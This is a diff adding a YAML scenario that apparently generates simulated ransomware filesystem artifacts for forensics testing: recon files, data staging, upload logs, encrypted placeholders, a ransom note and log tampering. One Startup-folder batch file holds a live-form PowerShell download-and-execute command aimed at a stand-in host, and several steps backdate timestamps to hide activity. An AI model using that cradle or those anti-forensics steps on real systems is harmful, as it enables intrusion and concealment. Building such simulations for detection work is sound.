@@ -1,0 +1,133 @@
+start: "2024-03-15T02:00:00Z"
+
+variables:
+  campaign_id: "RW2024-A"
+  target_org: "ACME Corp"
+
+actors:
+  - name: attacker
+    base: C/Users/victim
+    variables:
+      ip_addr: "203.0.113.45"
+      c2_domain: "evil.example.com"
+
+  - name: system
+    base: C/Windows/System32
+
+steps:
+  # Initial access - recon files
+  - actor: attacker
+    offset: 0s
+    batch_count: 10
+    actions:
+      - action: create
+        path: AppData/Local/Temp/recon-${BATCH}.txt
+        template: log
+        offset: ${BATCH}s
+
+  # Persistence via startup
+  - actor: attacker
+    offset: 5m
+    actions:
+      - action: create
+        path: AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/updater.bat
+        content: |
+          @echo off
+          powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://${VAR:c2_domain}/payload')"
+      - action: mace
+        path: AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/updater.bat
+        mtime: "2023-01-15T08:00:00Z"
+
+  # Data staging - collect documents
+  - actor: attacker
+    offset: 15m
+    repeat: 5
+    every: 3m
+    batch_count: 3
+    condition: even
+    actions:
+      - action: create
+        path: AppData/Local/staging/doc-${ITER}-${BATCH}.docx
+        content_len: 4096
+      - action: create
+        path: AppData/Local/staging/spreadsheet-${UUID}.xlsx
+        content_len: 8192
+
+  # Compress staged data
+  - actor: attacker
+    offset: 35m
+    actions:
+      - action: create
+        path: AppData/Local/staging/archive-${VAR:campaign_id}.zip
+        content_len: 32768
+        mtime: "2024-03-15T02:35:00Z"
+
+  # Exfiltration logs
+  - actor: attacker
+    offset: 40m
+    every: 1m
+    repeat: 10
+    actions:
+      - action: append
+        path: AppData/Local/Temp/upload.log
+        content: "${DATE:2006-01-02T15:04:05Z07:00} UPLOAD chunk-${SEQ} size=${HASH:8} ip=${VAR:ip_addr}\n"
+
+  # Deploy ransomware
+  - actor: attacker
+    offset: 1h
+    batch_count: 50
+    actions:
+      - action: create
+        path: Desktop/IMPORTANT_${BATCH}.txt.encrypted
+        content_len: 2048
+      - action: create
+        path: Desktop/${RND:12}.encrypted
+        content_len: 1024
+        condition: odd
+
+  # Ransom note
+  - actor: attacker
+    offset: 1h5m
+    actions:
+      - action: create
+        path: Desktop/README_${VAR:campaign_id}.txt
+        content: |
+          YOUR FILES HAVE BEEN ENCRYPTED
+
+          Campaign: ${VAR:campaign_id}
+          Victim ID: ${UUID}
+
+          To recover your files, contact us at:
+          ${VAR:c2_domain}
+
+          Payment required: 5 BTC
+          Deadline: 72 hours
+        mtime: "2024-03-15T03:05:00Z"
+
+      # Copy to multiple locations
+      - action: create
+        path: Documents/README.txt
+        content: "See Desktop/README_${VAR:campaign_id}.txt"
+
+  # Cover tracks - delete staging
+  - actor: attacker
+    offset: 1h10m
+    actions:
+      - action: delete
+        path: AppData/Local/staging/archive-${VAR:campaign_id}.zip
+      - action: delete
+        path: AppData/Local/Temp/upload.log
+      - action: truncate
+        path: AppData/Local/Temp/recon-0.txt
+
+  # Modify system logs (anti-forensics)
+  - actor: system
+    offset: 1h15m
+    actions:
+      - action: create
+        type: dir
+        path: winevt/Logs
+      - action: create
+        path: winevt/Logs/Security.evtx
+        content_len: 512
+        mtime: "2024-03-01T00:00:00Z"
